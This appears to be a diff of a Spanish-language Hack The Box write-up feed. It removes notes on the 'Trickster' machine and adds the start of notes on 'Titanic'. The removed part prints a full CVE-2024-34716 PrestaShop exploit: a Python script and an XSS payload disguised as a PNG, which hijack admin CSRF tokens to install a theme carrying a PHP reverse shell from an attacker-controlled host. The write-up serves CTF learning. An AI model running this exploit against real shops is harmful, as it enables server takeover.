@@ -1,1053 +1,734 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[HTB]]></title><description><![CDATA[Obsidian digital garden]]></description><link>http://github.com/dylang/node-rss</link><image><url>lib/media/favicon.png</url><title>HTB</title><link></link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Sat, 15 Feb 2025 12:38:33 GMT</lastBuildDate><atom:link href="lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Sat, 15 Feb 2025 12:38:30 GMT</pubDate><ttl>60</ttl><dc:creator></dc:creator><item><title><![CDATA[1.Recon]]></title><description><![CDATA[ 
- <br>Nmap TCP port SYN scan<br>sudo nmap -sS -Pn -n --min-rate 5000 -p- trickster.htb -oG nmapsS
-[sudo] password for cher0: 
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-12 10:15 CET
-Nmap scan report for trickster.htb (10.10.11.34)
-Host is up (0.043s latency).
-Not shown: 65533 closed tcp ports (reset)
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[HTB]]></title><description><![CDATA[Obsidian digital garden]]></description><link>http://github.com/dylang/node-rss</link><image><url>lib/media/favicon.png</url><title>HTB</title><link></link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Mon, 17 Feb 2025 20:21:08 GMT</lastBuildDate><atom:link href="lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Mon, 17 Feb 2025 20:21:05 GMT</pubDate><ttl>60</ttl><dc:creator></dc:creator><item><title><![CDATA[1.Recon]]></title><description><![CDATA[ 
+ <br><br><br>Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
 
-Nmap done: 1 IP address (1 host up) scanned in 11.42 seconds
-<br>Nmap TCP CV scan<br>sudo nmap -sCV -Pn -n --min-rate 5000 -p 22,80 trickster.htb -oG nmapsCV 
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-12 10:15 CET
-Nmap scan report for trickster.htb (10.10.11.34)
-Host is up (0.060s latency).
+Read data files from: /usr/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 70.18 seconds
+           Raw packets sent: 70069 (3.083MB) | Rcvd: 65972 (2.639MB)
 
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+<br><br>PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
-|   256 8c:01:0e:7b:b4:da:b7:2f:bb:2f:d3:a3:8c:a6:6d:87 (ECDSA)
-|_  256 90:c6:f3:d8:3f:96:99:94:69:fe:d3:72:cb:fe:6c:c5 (ED25519)
-80/tcp open  http    Apache httpd 2.4.52
-|_http-title: 403 Forbidden
-|_http-server-header: Apache/2.4.52 (Ubuntu)
-Service Info: Host: _; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGZG4yHYcDPrtn7U0l+ertBhGBgjIeH9vWnZcmqH0cvmCNvdcDY/ItR3tdB4yMJp0ZTth5itUVtlJJGHRYAZ8Wg=
+|   256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDT1btWpkcbHWpNEEqICTtbAcQQitzOiPOmc3ZE0A69Z
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
+|_http-favicon: Unknown favicon MD5: 79E1E0A79A613646F473CFEDA9E231F1
+| http-methods: 
+|_  Supported Methods: GET HEAD OPTIONS
+|_http-title: Titanic - Book Your Ship Trip
+| http-server-header: 
+|   Apache/2.4.52 (Ubuntu)
+|_  Werkzeug/3.0.3 Python/3.10.12
+Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 13.41 seconds
-<br><br><img alt="Pasted image 20250212101724.png" src="machines/trickster/imgs/pasted-image-20250212101724.png"><br>
-El apartado "shop" nos redirecciona a la siguiente url: <a rel="noopener nofollow" class="external-link" href="http://shop.trickster.htb/" target="_blank">http://shop.trickster.htb/</a><br>
-la metemos en el /etc/hosts<br>10.10.11.34 trickster.htb shop.trickster.htb
-<br><br>Vamos a aplicar Fuzzing;<br><br>feroxbuster -u http://trickster.htb -r -w /usr/share/seclist/Discovery/Web-Content/raft-large-directories-lowercase.txt -C 503
-                                                                                                                      
+<br><br><br>➜  ~ feroxbuster --url http://titanic.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -t 200
+                                                                                                                     
  ___  ___  __   __     __      __         __   ___
 |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
 |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
-by Ben "epi" Risher                    ver: 2.11.0
+by Ben "epi" Risher 🤓                 ver: 2.11.0
 ───────────────────────────┬──────────────────────
-     Target Url            │ http://trickster.htb
-     Threads               │ 50
-     Wordlist              │ /usr/share/seclist/Discovery/Web-Content/raft-large-directories-lowercase.txt
-     Status Code Filters   │ [503]
-     Timeout (secs)        │ 7
-     User-Agent            │ feroxbuster/2.11.0
-     Config File           │ /etc/feroxbuster/ferox-config.toml
-     Extract Links         │ true
-     HTTP methods          │ [GET]
-     Follow Redirects      │ true
-     Recursion Depth       │ 4
+ 🎯  Target Url            │ http://titanic.htb
+ 🚀  Threads               │ 200
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
 ───────────────────────────┴──────────────────────
  🏁  Press [ENTER] to use the Scan Management Menu™
 ──────────────────────────────────────────────────
-403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
-404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
-200      GET        2l       87w     2438c http://trickster.htb/assets/js/breakpoints.min.js
-200      GET       37l       80w      568c http://trickster.htb/assets/css/noscript.css
-200      GET      587l     1232w    11847c http://trickster.htb/assets/js/util.js
-200      GET      401l      738w     8035c http://trickster.htb/assets/js/main.js
-200      GET       22l       68w     8886c http://trickster.htb/images/overlay.png
-200      GET     1638l     3543w    34125c http://trickster.htb/assets/css/main.css
-200      GET        2l     1283w    86927c http://trickster.htb/assets/js/jquery.min.js
-503      GET       11l       42w      378c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
-503      GET       11l       42w      378c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
-200      GET     3386l    19800w  1485483c http://trickster.htb/images/pic01.jpg
-200      GET     7017l    47787w  3060292c http://trickster.htb/images/pic02.jpg
-200      GET     7166l    43779w  3126314c http://trickster.htb/images/pic03.jpg
-200      GET      355l      927w    12683c http://trickster.htb/
-200      GET    13704l    73264w  5732348c http://trickster.htb/images/bg.jpg
-200      GET       20l       94w     1730c http://trickster.htb/images/
-<br><br><br>➜  ~ wappalyzer -i http://shop.trickster.htb
-http://shop.trickster.htb Apache HTTP Server v2.4.52, Ubuntu, PrestaShop, jQuery v3.5.1, jQuery UI v1.10.3, PHP, Bootstrap, core-js v2.6.12, jQuery Migrate v3.1.0, Cart Functionality, Open Graph
-<br>El subdomino usa Prestashop;<br>
-PrestaShop es un sistema de gestión de contenidos libre y de código abierto pensado para construir desde cero tiendas en línea de comercio electrónico. Enfocado para permitir crear tiendas en línea desde pequeñas empresas a grandes corporaciones<br><br>feroxbuster -u http://shop.trickster.htb -r -w /usr/share/seclist/Discovery/Web-Content/raft-large-directories-lowercase.txt -C 503 403
-                                                                                                                      
- ___  ___  __   __     __      __         __   ___
-|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
-|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
-by Ben "epi" Risher                    ver: 2.11.0
-───────────────────────────┬──────────────────────
-     Target Url            │ http://shop.trickster.htb
-     Threads               │ 50
-     Wordlist              │ /usr/share/seclist/Discovery/Web-Content/raft-large-directories-lowercase.txt
-     Status Code Filters   │ [503, 403]
-     Timeout (secs)        │ 7
-     User-Agent            │ feroxbuster/2.11.0
-     Config File           │ /etc/feroxbuster/ferox-config.toml
-     Extract Links         │ true
-     HTTP methods          │ [GET]
-     Follow Redirects      │ true
-     Recursion Depth       │ 4
-───────────────────────────┴──────────────────────
- 🏁  Press [ENTER] to use the Scan Management Menu™
-──────────────────────────────────────────────────
-200      GET     1043l     2429w    44977c http://shop.trickster.htb/password-recovery
-404      GET     1006l     2319w    43228c http://shop.trickster.htb/log
-200      GET        7l       17w      112c http://shop.trickster.htb/.git/config
-200      GET        1l        2w       28c http://shop.trickster.htb/.git/HEAD
-200      GET     1423l     2799w    53077c http://shop.trickster.htb/registration
-200      GET        1l       10w       73c http://shop.trickster.htb/.git/description
-200      GET        1l        3w       20c http://shop.trickster.htb/.git/COMMIT_EDITMSG
-200      GET     1071l     2387w    44984c http://shop.trickster.htb/guest-tracking
-200      GET        1l       11w      163c http://shop.trickster.htb/.git/logs/HEAD
-200      GET        6l       43w      240c http://shop.trickster.htb/.git/info/exclude
-200      GET       53l      234w     1374c http://shop.trickster.htb/.git/hooks/pre-push.sample
-200      GET       78l      499w     2783c http://shop.trickster.htb/.git/hooks/push-to-checkout.sample
-200      GET       42l      238w     1492c http://shop.trickster.htb/.git/hooks/prepare-commit-msg.sample
-200      GET        8l       32w      189c http://shop.trickster.htb/.git/hooks/post-update.sample
-200      GET       13l       67w      416c http://shop.trickster.htb/.git/hooks/pre-merge-commit.sample
-200      GET       24l       83w      544c http://shop.trickster.htb/.git/hooks/pre-receive.sample
-200      GET       14l       69w      424c http://shop.trickster.htb/.git/hooks/pre-applypatch.sample
-200      GET       49l      279w     1643c http://shop.trickster.htb/.git/hooks/pre-commit.sample
-200      GET      174l      675w     4726c http://shop.trickster.htb/.git/hooks/fsmonitor-watchman.sample
-200      GET      978l     2780w   316386c http://shop.trickster.htb/.git/index
-200      GET      128l      546w     3650c http://shop.trickster.htb/.git/hooks/update.sample
-200      GET       15l       79w      478c http://shop.trickster.htb/.git/hooks/applypatch-msg.sample
-200      GET       77l      323w     2308c http://shop.trickster.htb/.git/hooks/sendemail-validate.sample
-200      GET      169l      798w     4898c http://shop.trickster.htb/.git/hooks/pre-rebase.sample
-200      GET       24l      163w      896c http://shop.trickster.htb/.git/hooks/commit-msg.sample
-200      GET        1l        1w       41c http://shop.trickster.htb/.git/refs/heads/admin_panel
-404      GET     1006l     2319w    43251c http://shop.trickster.htb/upload/
-200      GET     1155l     2446w    46526c http://shop.trickster.htb/login
-200      GET     1155l     2446w    46636c http://shop.trickster.htb/login?back=my-account
-404      GET     1006l     2319w    43294c http://shop.trickster.htb/.git/hooks/.git
-200      GET     1102l     2444w    46283c http://shop.trickster.htb/cart?action=show
-404      GET     1006l     2319w    43326c http://shop.trickster.htb/.git/refs/heads/.git/
-404      GET     1006l     2319w    43350c http://shop.trickster.htb/.git/refs/heads/.git/refs
-200      GET     1155l     2446w    46615c http://shop.trickster.htb/login?back=history
-200      GET     1051l     2357w    44462c http://shop.trickster.htb/search
-404      GET     1006l     2319w    43345c http://shop.trickster.htb/.git/refs/tags/.git/refs
-404      GET     1006l     2319w    43325c http://shop.trickster.htb/.git/refs/tags/.git/
-200      GET     1155l     2446w    46629c http://shop.trickster.htb/login?back=addresses
-404      GET     1006l     2319w    43325c http://shop.trickster.htb/.git/logs/refs/.git/
-404      GET     1006l     2319w    43309c http://shop.trickster.htb/.git/branches/.git
+404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+405      GET        5l       20w      153c http://titanic.htb/book
+200      GET       30l       77w      567c http://titanic.htb/static/styles.css
+200      GET     2986l     7000w   469100c http://titanic.htb/static/assets/images/favicon.ico
+200      GET      664l     5682w   412611c http://titanic.htb/static/assets/images/home.jpg
+200      GET      859l     5115w   510909c http://titanic.htb/static/assets/images/luxury-cabins.jpg
+200      GET      890l     5324w   534018c http://titanic.htb/static/assets/images/entertainment.jpg
+200      GET      851l     5313w   507854c http://titanic.htb/static/assets/images/exquisite-dining.jpg
+200      GET      156l      415w     7399c http://titanic.htb/
 
-<br>Durante el fuzzing encontramos un repositorio /.git accesible;  tratamos de dumpearlo<br><br>Con la herramienta de <a data-tooltip-position="top" aria-label="https://github.com/arthaud/git-dumper" rel="noopener nofollow" class="external-link" href="https://github.com/arthaud/git-dumper" target="_blank">git-dumper</a> dumpeamos todo el directorio de /.git<br> ./git_dumper.py http://shop.trickster.htb/.git/ DUMP
-<br>DUMP:<br>
-En el directorio encontramos varios archivos, entre ellos un Makefile lo que nos puede dar una pista de que nos enfrentamos a un contenedor de Docker y varios archivos .php lo que nos confirma que el servidor maneja lenguaje php que nos puede ser de ayuda para explotar la maquina<br>(venv) ➜  DUMP git:(admin_panel) ls -ls
-total 216
-  8 -rw-rw-r-- 1 cher0 cher0   5054 Feb 12 12:16 INSTALL.txt
-  4 -rw-rw-r-- 1 cher0 cher0    522 Feb 12 12:16 Install_PrestaShop.html
-180 -rw-rw-r-- 1 cher0 cher0 183862 Feb 12 12:16 LICENSES
-  4 -rw-rw-r-- 1 cher0 cher0    863 Feb 12 12:16 Makefile
-  4 drwxrwxr-x 8 cher0 cher0   4096 Feb 12 12:16 admin634ewutrx1jgitlooaj
-  4 -rw-rw-r-- 1 cher0 cher0   1305 Feb 12 12:16 autoload.php
-  4 -rw-rw-r-- 1 cher0 cher0   2506 Feb 12 12:16 error500.html
-  4 -rw-rw-r-- 1 cher0 cher0   1169 Feb 12 12:16 index.php
-  4 -rw-rw-r-- 1 cher0 cher0   1256 Feb 12 12:16 init.php
-
-<br>En el Install.txt vemos que la instalacion se trata de un Pentashop 8 lo que nos puede indicar que el software esta usando su version 8; tambien nos confirma que precisa de PHP v 7.2 o superior y un servidor de datos MySQL.<br><img alt="Pasted image 20250212122216.png" src="machines/trickster/imgs/pasted-image-20250212122216.png"><br>si entramos en el endpoint /admin634ewutrx1jgitlooaj encontramos un admin panel en shop; ademas descubrimos la version de PrestaShop que corre en la 8.1.5<br><img alt="Pasted image 20250213103827.png" src="machines/trickster/imgs/pasted-image-20250213103827.png"><br><br>Esta version de PrestaShop es vulnerable a XSS ; <a data-tooltip-position="top" aria-label="https://github.com/PrestaShop/PrestaShop/security/advisories/GHSA-45vm-3j38-7p78" rel="noopener nofollow" class="external-link" href="https://github.com/PrestaShop/PrestaShop/security/advisories/GHSA-45vm-3j38-7p78" target="_blank">github</a><br>El exploit se puede triggerear en el contact form de la pagina; un atacante puede subir un archivo malicioso que triggerea el XSS cuando lo abre el administrador ;<br>Nos dirigimos al formulario<br>http://shop.trickster.htb/contact-us
-<br><img alt="Pasted image 20250213104457.png" src="machines/trickster/imgs/pasted-image-20250213104457.png"><br>Encuentro este <a data-tooltip-position="top" aria-label="https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/" rel="noopener nofollow" class="external-link" href="https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/" target="_blank">documento</a> que detalla la explotacion de la vulnerabilidad <br>Nos bajamos el script automatizado de github y lo analizamos, el documento ya aclara como se explota la vulnerabilidad XSS pero podemos llegar a RCE enviando un .html malicioso disfrazado de imagen png;<br>➜  CVE-2024-34716_PoC git:(main) ls -laF 
-total 7320
-drwxrwxr-x 3 cher0 cher0    4096 Feb 13 10:51 ./
-drwxrwxr-x 5 cher0 cher0    4096 Feb 13 10:51 ../
-drwxrwxr-x 8 cher0 cher0    4096 Feb 13 10:51 .git/
--rw-rw-r-- 1 cher0 cher0      47 Feb 13 10:51 .gitignore
--rw-rw-r-- 1 cher0 cher0     346 Feb 13 10:51 README.md
--rw-rw-r-- 1 cher0 cher0    4434 Feb 13 10:51 exploit.html
--rw-rw-r-- 1 cher0 cher0    5100 Feb 13 10:51 exploit.py
--rw-rw-r-- 1 cher0 cher0 7444481 Feb 13 10:51 ps_next_8_theme_malicious_old.zip
--rw-rw-r-- 1 cher0 cher0      32 Feb 13 10:51 requirements.txt
--rw-rw-r-- 1 cher0 cher0    5496 Feb 13 10:51 reverse_shell_template.php
-
-<br>Atached a zip theme file that was used for testing and the same ZIP contains a .htaccess file with the content below, which will enforce and allow access to the directory where we host our reverse_shell.php. It’s basically to allow everyone to view or interact with the contents of the directory without restrictions, because if we didn’t do this, we wouldn’t be able to access our reverse_shell.php that grants us a reverse shell and we would get forbidden instead.<br>&lt;IfModule mod_authz_core.c&gt;
- Require all granted
-&lt;/IfModule&gt;
-<br><br>Analizamos el siguiente PoC del CVE para conseguir RCE en PrestaShop;<br>import argparse, requests, subprocess, time, threading, atexit, http.server, socketserver,zipfile,shutil,os
-from bs4 import BeautifulSoup
-
-
-print_lock = threading.Lock()
-stop_event = threading.Event()
-
-def __parse_args():    
-    parser = argparse.ArgumentParser(description="CVE-2024-34716 Exploit")
-    parser.add_argument("--url", help="The Presta Shop base url.", required=True)
-    parser.add_argument("--email", help="The email address of admin user.", required=True)
-    parser.add_argument("--local-ip", help="Local HTTP Server IP.", required=True)
-    parser.add_argument("--admin-path", help="The Presta Shop admin path.", required=True) 
-    
-    args = parser.parse_args()
-    
-    host_url = args.url
-    email = args.email
-    local_ip = args.local_ip
-    admin_path = args.admin_path
-
-    print("[X] Starting exploit with:")
-    print(f"\tUrl: {host_url}")
-    print(f"\tEmail: {email}")
-    print(f"\tLocal IP: {local_ip}")
-    print(f"\tAdmin Path: {admin_path}")
-                
-    return (host_url, email, local_ip, admin_path)
-    
-    
-def send_get_requests(url, interval=5):
-    while not stop_event.is_set():
-        try:
-            response = requests.get(url)
-            if response.status_code == 504 or response.status_code == 200:
-                stop_event.set()
-                return
-            print(f"GET request to {url}: {response.status_code}")
-            
-        except requests.RequestException as e:
-            with print_lock:
-                print(f"Error during GET request: {e}") # Can comment this out if thread isn't stopped.
-        time.sleep(interval)
-
-
-def run_http_server():
-    PORT = 5000
-    with socketserver.TCPServer(("", PORT), CustomRequestHandler) as httpd:
-        with print_lock:
-            print("Serving at http.Server on port", PORT)
-        while not stop_event.is_set():
-            httpd.handle_request()
-        
-
-def main():    
-    host_url, email, local_ip, admin_path = __parse_args()
-
-    with open('./exploit.html', 'r') as file:
-        html_content = file.read()
-
-    if host_url[-1] == '/':
-        host_url = host_url[:-1]
-
-    html_content = html_content.replace("BASE_URL", f'"{host_url}"')
-    html_content = html_content.replace("ATTACKER_IP", f'"{local_ip}"')
-    html_content = html_content.replace("ATTACKER_PORT", "5000")
-    html_content = html_content.replace("ADMIN_PATH", f'"{admin_path}"')
-    html_content = html_content.replace("FILE_NAME", '"ps_next_8_theme_malicious.zip"')
-
-    with open('./reverse_shell_template.php', 'r') as file:
-        reverse_shell_content = file.read()
-    
-    reverse_shell_content = reverse_shell_content.replace("ATTACKER_IP", f'"{local_ip}"')
-    reverse_shell_content = reverse_shell_content.replace("ATTACKER_PORT", "12345")
-
-    with open('./reverse_shell.php', 'w') as file:
-        file.write(reverse_shell_content)
-    
-    shutil.copy('ps_next_8_theme_malicious_old.zip', 'ps_next_8_theme_malicious.zip')
-    with zipfile.ZipFile('ps_next_8_theme_malicious.zip', 'a') as zipf:
-        zipf.write('reverse_shell.php','reverse_shell_new.php')
-
-
-
-    url = f"{host_url}/contact-us"
-
-    response = requests.get(url)
-    response.raise_for_status()
-
-    soup = BeautifulSoup(response.text, 'html.parser')
-    token = soup.find('input', {'name': 'token'})['value']
-    cookies = response.cookies
-
-    files = {
-        'fileUpload': ('test.png', html_content, 'image/png'),
-    }
-
-    data = {
-        'id_contact': '2',
-        'from': email,
-        'message': 'pwned',
-        'url': '',
-        'token': token,
-        'submitMessage': 'Send'
-    }
-
-    response = requests.post(url, files=files, data=data, cookies=cookies)
-    url = f"{host_url}/themes/next/reverse_shell_new.php"
-
-    req_thread = threading.Thread(target=send_get_requests, args=(url, 15,))
-    req_thread.daemon = True
-    req_thread.start()
-    
-    server_thread = threading.Thread(target=run_http_server)
-    server_thread.daemon = True
-    server_thread.start()
-
-    if response.status_code == 200:
-        print(f"[X] Ncat is now listening on port 12345. Press Ctrl+C to terminate.")
-        
-        output = subprocess.call(["ncat", "-lnvp", "12345"], shell=False)
-        if b"Ncat: Connection from " in output:
-            with print_lock:
-                print("Stopping threads!")
-            stop_event.set()
-        else:
-            print(f"DEBUG:: {output}")
-    else:
-        print(f"[!] Failed to send the message. Status code: {response.status_code} Reason: {response.reason}")
-
-
-def clean():
-    if os.path.exists('ps_next_8_theme_malicious.zip'):
-        os.remove('ps_next_8_theme_malicious.zip')
-    if os.path.exists('reverse_shell.php'):
-        os.remove('reverse_shell.php')
-
-class CustomRequestHandler(http.server.SimpleHTTPRequestHandler):
-    def log_request(self, code='-', size='-'):
-        with print_lock:
-            print(f"Request: {self.command} {self.path} {self.request_version}")
-            print(f"Response: {code} {size}")
-        super().log_request(code, size)
-
-
-
-if __name__ == "__main__":
-    clean()
-    atexit.register(clean)
-    main()
-
-<br><br>Esta función configura y parsea los argumentos necesarios para ejecutar el exploit:<br>
-<br>Argumentos requeridos :
-
-<br>--url: URL base del sitio vulnerable.
-<br>--email: Dirección de correo electrónico del administrador.
-<br>--local-ip: IP local donde se ejecutará el servidor HTTP y el shell inverso.
-<br>--admin-path: Ruta del panel de administración de PrestaShop.
-
-
-<br>Después de parsear los argumentos, imprime la configuración seleccionada.<br><br>Esta función envía solicitudes GET repetidas a una URL específica hasta que ocurra una condición de detención (stop_event.is_set()).<br>
-<br>Si recibe un código de respuesta 504 o 200, detiene las solicitudes.
-<br>Utiliza un intervalo entre solicitudes para evitar saturar el servidor.
-<br><br>Levanta un servidor HTTP local en el puerto 5000:<br>
-<br>Usa CustomRequestHandler como manejador personalizado para registrar las solicitudes entrantes.
-<br>El servidor permanece activo hasta que se establezca stop_event.****
-<br><br>Esta es la función principal del script, donde ocurre la lógica del exploit:<br><br>
-<br>Lee el archivo exploit.html y reemplaza marcadores de posición (BASE_URL, ATTACKER_IP, etc.) con los valores proporcionados por el usuario.
-
-<br>exploit.html:
-
-
-<br>&lt;!DOCTYPE html&gt;
-&lt;html lang="en"&gt;
-
-&lt;head&gt;
-    &lt;meta charset="UTF-8"&gt;
-    &lt;meta viewport="width=device-width, initial-scale=1.0"&gt;
-    &lt;title&gt;Exploit&lt;/title&gt;
-&lt;/head&gt;
-
-&lt;body&gt;
-    &lt;script&gt;
-        const baseUrl = BASE_URL;
-        const path = ADMIN_PATH;
-        const httpServerIp = ATTACKER_IP;
-        const httpServerPort = ATTACKER_PORT;
-        const fileNameOfTheme = FILE_NAME;
-
-        async function fetchTokenFromHTML() {
-            const url = `${baseUrl}/${path}/index.php/improve/design/themes/import`;
-            try {
-                const response = await fetch(url, {
-                    method: 'GET',
-                    credentials: 'include',
-                    redirect: 'follow'
-                });
-                if (!response.ok) throw new Error('Failed to fetch the page for token extraction. Status: ' + response.status);
-
-                const htmlText = await response.text();
-                const parser = new DOMParser();
-                const doc = parser.parseFromString(htmlText, "text/html");
-
-                const anchor = doc.querySelector('a.btn.btn-lg.btn-outline-danger.mr-3');
-                const href = anchor ? anchor.getAttribute('href') : null;
-                const match = href ? href.match(/_token=([^&amp;]+)/) : null;
-                const token = match ? match[1] : null;
-                if (!token) throw new Error('Token not found in anchor tag href.');
-
-                console.log('Extracted Token from HTML:', token);
-                return token;
-            } catch (error) {
-                console.error('Error fetching token from HTML content:', error);
-                return null;
-            }
-        }
-
-        async function fetchCSRFToken(token) {
-            const csrfUrl = `${baseUrl}/${path}/index.php/improve/design/themes/import?_token=${token}`;
-            try {
-                const response = await fetch(csrfUrl, {
-                    method: 'GET',
-                    credentials: 'include',
-                    redirect: 'follow'
-                });
-                if (!response.ok) throw new Error('Failed to fetch the page for CSRF token extraction. Status: ' + response.status);
-
-                const htmlText = await response.text();
-                const parser = new DOMParser();
-                const doc = parser.parseFromString(htmlText, "text/html");
-
-                const csrfTokenInput = doc.querySelector('input[name="import_theme[_token]"]');
-                const csrfToken = csrfTokenInput ? csrfTokenInput.value : null;
-                if (!csrfToken) throw new Error('CSRF token not found in HTML content.');
-
-                console.log('Extracted CSRF Token:', csrfToken);
-                return csrfToken;
-            } catch (error) {
-                console.error('Error fetching CSRF token:', error);
-                return null;
-            }
-        }
-
-        async function importTheme() {
-            try {
-                const locationHeaderToken = await fetchTokenFromHTML();
-                if (!locationHeaderToken) {
-                    console.error('Failed to fetch token from HTML');
-                    return;
-                }
-
-                const csrfToken = await fetchCSRFToken(locationHeaderToken);
-                if (!csrfToken) {
-                    console.error('Failed to fetch CSRF token');
-                    return;
-                }
-
-                const formData = new FormData();
-                formData.append('import_theme[import_from_web]', `http://${httpServerIp}:${httpServerPort}/${fileNameOfTheme}`);
-                formData.append('import_theme[_token]', csrfToken);
-
-                const postUrl = `/${path}/index.php/improve/design/themes/import?_token=${locationHeaderToken}`;
-                console.log('POST URL:', postUrl);
-
-                const response = await fetch(postUrl, {
-                    method: 'POST',
-                    body: formData,
-                });
-
-                if (response.ok) {
-                    console.log('Theme imported successfully');
-                } else {
-                    console.error('Failed to import theme. Response Status:', response.status);
-                }
-            } catch (error) {
-                console.error('Error importing theme:', error);
-            }
-        }
-
-        document.addEventListener('DOMContentLoaded', function () {
-            importTheme();
-        });
-    &lt;/script&gt;
-&lt;/body&gt;
-
-&lt;/html&gt;
-<br><br>
-<br>El html extrae dos tokens necesarios para autenticar las solicitudes en el panel de administración de PrestaShop.
-<br>Envía una solicitud POST para importar un tema malicioso desde el servidor HTTP local del atacante.
-<br>Si todo funciona correctamente, el tema malicioso se instala en el servidor objetivo, permitiendonos ejecutar código arbitrario.
-<br>
-<br>
-Lee el archivo reverse_shell_template.php, reemplaza los marcadores de posición y guarda el resultado en reverse_shell.php.
-
-<br>la reverse_shell_template.php es la mítica rev-shell de <a data-tooltip-position="top" aria-label="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" rel="noopener nofollow" class="external-link" href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" target="_blank">pentestmonkey</a>
-
-
-<br>
-Copia el archivo ps_next_8_theme_malicious_old.zip, agrega el archivo reverse_shell.php dentro del ZIP y lo guarda como ps_next_8_theme_malicious.zip.
-
-<br><br>
-<br>Realiza una solicitud GET a la página /contact-us del sitio objetivo.
-<br>Extrae el valor del token CSRF del formulario usando BeautifulSoup.
-<br><br>
-<br>Prepara una solicitud POST con los siguientes datos:
-
-<br>Un archivo adjunto (exploit.html disfrazado como imagen).
-<br>Datos del formulario con el token CSRF, dirección de correo electrónico y mensaje.
-
-
-<br>Envía la solicitud POST a /contact-us.
-<br><br>
-<br>Inicia un hilo para enviar solicitudes GET repetidas al archivo PHP malicioso (reverse_shell_new.php) en el servidor objetivo.
-<br>Inicia otro hilo para ejecutar el servidor HTTP local.
-<br><br>
-<br>Si la solicitud POST tiene éxito, inicia un servidor de escucha con ncat en el puerto 12345 para recibir la conexión inversa del shell.
-<br>Si se detecta una conexión, detiene todos los hilos.
-<br><br>Realiza una limpieza al finalizar:<br>
-<br>Elimina el archivo ZIP modificado (ps_next_8_theme_malicious.zip).
-<br>Elimina el archivo PHP  (reverse_shell.php).
-<br><br><br>Nos creamos una cuenta en el prestashop:<br>
-<img alt="Pasted image 20250213112820.png" src="machines/trickster/imgs/pasted-image-20250213112820.png"><br><img alt="Pasted image 20250213120710.png" src="machines/trickster/imgs/pasted-image-20250213120710.png"><br><br>$ cat /etc/passwd | grep -E "/bin/sh|/bin/bash"
+<br>Un whatweb nos indica que estamos trabajando contra un Servidor web Python, Wekzeug;<br>➜  ~ whatweb http://titanic.htb 
+http://titanic.htb [200 OK] Bootstrap[4.5.2], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.3 Python/3.10.12], IP[10.10.11.55], JQuery, Python[3.10.12], Script, Title[Titanic - Book Your Ship Trip], Werkzeug[3.0.3]
+<br>Parece una pagina tipo "booking" para entradas al Titanic, esta cachonda;<br><img alt="Pasted image 20250217165949.png" src="machines/titanic/imgs/pasted-image-20250217165949.png"><br>
+Ninguno de los botones de la pagina funcionan excepto el de Book Now;<br>
+<img alt="Pasted image 20250217170046.png" src="machines/titanic/imgs/pasted-image-20250217170046.png"><br>Si le damos a submit nos decarga el formulario en formato json;<br>
